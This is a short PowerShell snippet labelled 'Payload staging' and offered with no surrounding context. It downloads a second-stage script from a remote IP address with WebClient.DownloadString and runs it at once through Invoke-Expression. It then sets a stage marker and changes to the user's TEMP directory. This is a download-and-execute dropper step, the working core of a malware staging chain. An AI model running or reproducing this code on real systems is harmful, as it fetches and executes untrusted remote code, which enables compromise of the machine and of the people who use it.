
<# Payload staging #> $Stage2Url = 'http://198.51.100.239/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($Stage2Url); $StageMarker = "stage-5"; Set-Location -Path $env:TEMP
